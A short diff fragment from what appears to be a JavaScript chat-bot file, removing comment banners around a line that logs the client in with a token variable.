-// BOT LOGIN
-// ============================================================
 client.login(TOKEN);
-
-// ============================================================
-// END OF FILE – 846 LINES
-// ============================================================
